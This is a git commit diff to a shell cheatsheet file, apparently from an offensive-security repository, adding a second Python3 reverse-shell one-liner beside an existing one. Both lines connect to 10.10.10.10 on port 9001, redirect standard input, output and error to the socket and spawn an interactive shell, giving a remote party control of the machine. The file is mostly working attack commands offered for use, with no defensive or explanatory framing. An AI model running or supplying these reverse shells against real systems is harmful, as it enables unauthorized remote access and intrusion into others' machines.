6bee32e96620f573409d0f1a093616718b858f13
NextGenSec <142174128+NextGenSec-Github@users.noreply.github.com>
2024-04-07 00:41:55 +0500

    Update random.sh

--- Command Cheatsheets/random.sh
+++ Command Cheatsheets/random.sh
@@ -21,3 +21,4 @@ ip addr show eth0
 
 # Reverse Shell with Python3
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
+export RHOST="10.10.10.10";export RPORT=9001;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
